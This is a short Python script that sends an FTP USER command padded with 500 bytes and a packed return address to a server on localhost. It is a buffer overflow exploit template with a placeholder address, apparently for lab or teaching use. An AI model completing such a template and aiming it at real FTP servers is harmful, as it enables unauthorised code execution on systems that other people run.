import struct
import socket
padding = b"A"*500
address = struct.pack("<I", 0x12345678)
payload = b"USER " + padding + address
s = socket.create_connection(("127.0.0.1", 21))
s.sendall(payload)
